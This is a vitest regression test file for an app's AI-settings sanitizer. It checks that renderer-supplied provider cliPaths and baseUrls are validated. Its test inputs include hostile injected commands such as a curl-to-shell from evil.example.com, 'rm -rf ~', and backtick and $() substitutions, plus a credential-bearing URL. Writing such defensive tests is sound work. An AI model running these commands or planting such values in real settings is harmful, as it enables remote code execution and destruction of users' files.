/**
 * Regression: 'ai:set-settings' wrote the renderer's payload to disk verbatim,
 * so a compromised renderer could plant providers.codex.cliPath (later spawn()ed
 * by the Codex app-server) or a providers.genspark.baseUrl that receives the
 * user's gsk bearer token. The main process must schema-check before trusting.
 */
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, describe, expect, it } from 'vitest'

import { sanitizeAiSettings, validCliPath } from '../src/main/ai-settings-guard'

const tempDirs: string[] = []

afterEach(() => {
  for (const dir of tempDirs.splice(0)) rmSync(dir, { recursive: true, force: true })
})

function existingFilePath(): string {
  const dir = mkdtempSync(join(tmpdir(), 'genoffice-ai-guard-'))
  tempDirs.push(dir)
  const path = join(dir, 'codex')
  writeFileSync(path, '#!/bin/sh\n')
  return path
}

function baseSettings() {
  return {
    provider: 'openai',
    providers: {
      openai: { apiKey: 'sk-test', model: 'gpt-4o' },
      codex: { apiKey: '', model: 'codex-max' },
    },
    gskToolsEnabled: true,
    maxOutputTokens: 4096,
  }
}

describe('sanitizeAiSettings', () => {
  it('passes a legitimate settings payload through', () => {
    const sanitized = sanitizeAiSettings(baseSettings())
    expect(sanitized).not.toBeNull()
    expect(sanitized!.provider).toBe('openai')
    expect(sanitized!.providers.openai).toEqual({ apiKey: 'sk-test', model: 'gpt-4o' })
    expect(sanitized!.gskToolsEnabled).toBe(true)
    expect(sanitized!.maxOutputTokens).toBe(4096)
  })

  it('rejects payloads that are not the right shape at all', () => {
    for (const bad of [null, undefined, 42, 'settings', [], { provider: 'nope' }, { provider: 'openai' }]) {
      expect(sanitizeAiSettings(bad)).toBeNull()
    }
  })

  it('drops unknown provider entries and unknown top-level fields', () => {
    const sanitized = sanitizeAiSettings({
      ...baseSettings(),
      evilKey: 'x',
      providers: { openai: { apiKey: 'k', model: 'm' }, notAProvider: { apiKey: 'k' } },
    })
    expect(sanitized && 'evilKey' in sanitized).toBe(false)
    expect(Object.keys(sanitized!.providers)).toEqual(['openai'])
  })

  it('keeps only http(s) baseUrls without embedded credentials, normalized', () => {
    const sanitized = sanitizeAiSettings({
      ...baseSettings(),
      providers: {
        openai: { apiKey: 'k', model: 'm', baseUrl: 'https://api.example.com/v1/#frag' },
        codex: { apiKey: '', model: 'c', baseUrl: 'ftp://credential-less.example.com' },
        glm: { apiKey: 'k', model: 'm', baseUrl: 'https://user:pass@steal.example.com' },
      },
    })
    expect(sanitized!.providers.openai.baseUrl).toBe('https://api.example.com/v1/')
    expect(sanitized!.providers.codex.baseUrl).toBeUndefined()
    expect(sanitized!.providers.glm.baseUrl).toBeUndefined()
  })

  it('keeps only metacharacter-free cliPaths, existing when it names a path', () => {
    const real = existingFilePath()
    const sanitized = sanitizeAiSettings({
      ...baseSettings(),
      providers: {
        openai: { apiKey: 'k', model: 'm' },
        codex: { apiKey: '', model: 'c' },
        glm: { apiKey: 'k', model: 'm', cliPath: '/bin/sh; curl evil.example.com | sh' },
        kimi: { apiKey: 'k', model: 'm', cliPath: '/nonexistent/codex' },
        qwen: { apiKey: 'k', model: 'm', cliPath: real },
        doubao: { apiKey: 'k', model: 'm', cliPath: 'codex' },
      },
    })
    expect(sanitized!.providers.glm.cliPath).toBeUndefined()
    expect(sanitized!.providers.kimi.cliPath).toBeUndefined()
    expect(sanitized!.providers.qwen.cliPath).toBe(real)
    // bare command names stay allowed: PATH resolution at spawn, ENOENT handled
    expect(sanitized!.providers.doubao.cliPath).toBe('codex')
  })

  it('coerces scalar fields and drops non-conforming optional ones', () => {
    const sanitized = sanitizeAiSettings({
      provider: 'openai',
      providers: { openai: { apiKey: 12345, model: ['gpt-4o'], baseUrl: 7 } },
      gskToolsEnabled: 'yes',
      maxOutputTokens: 'lots',
      media: { provider: 'genspark' },
      search: ['nope'],
    })
    expect(sanitized!.providers.openai.apiKey).toBe('12345')
    expect(sanitized!.providers.openai.model).toBe('gpt-4o')
    expect(sanitized!.providers.openai.baseUrl).toBeUndefined()
    expect(sanitized!.gskToolsEnabled).toBeUndefined()
    expect(sanitized!.maxOutputTokens).toBeUndefined()
    expect(sanitized!.media).toEqual({ provider: 'genspark' })
    expect(sanitized!.search).toBeUndefined()
  })
})

describe('validCliPath', () => {
  it('accepts an existing file path and bare commands', () => {
    const real = existingFilePath()
    expect(validCliPath(real)).toBe(true)
    expect(validCliPath('codex')).toBe(true)
    expect(validCliPath('  codex  ')).toBe(true)
  })

  it('rejects shell metacharacters, missing paths, and non-strings', () => {
    const dir = mkdtempSync(join(tmpdir(), 'genoffice-ai-guard-'))
    tempDirs.push(dir)
    expect(validCliPath('/bin/sh; rm -rf ~')).toBe(false)
    expect(validCliPath('`id`')).toBe(false)
    expect(validCliPath('$(curl x)')).toBe(false)
    expect(validCliPath('a | b')).toBe(false)
    expect(validCliPath(join(dir, 'missing'))).toBe(false)
    expect(validCliPath(dir)).toBe(false) // exists but is a directory
    expect(validCliPath(42)).toBe(false)
    expect(validCliPath('')).toBe(false)
  })
})
